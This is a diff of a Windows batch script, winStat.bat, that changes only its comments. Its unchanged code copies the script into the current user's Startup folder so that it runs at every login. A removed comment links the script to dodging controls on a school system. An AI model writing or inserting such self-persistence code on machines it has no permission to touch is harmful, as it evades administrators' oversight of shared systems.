@@ -1,7 +1,6 @@
 @ECHO OFF
 COLOR 0A
-::Everything is better with color 0a (Matrix)
-::School system may update to win10 next year,I have found NO information on whether cmd can be blocked in win10! YAY!
+::I was hoping to not have it copy itself into the startup folder because of some... accidents I have had, but whatever. XD
 IF NOT EXIST "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\winStat.bat" (
 COPY winStat.bat "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\winStat.bat"
 )
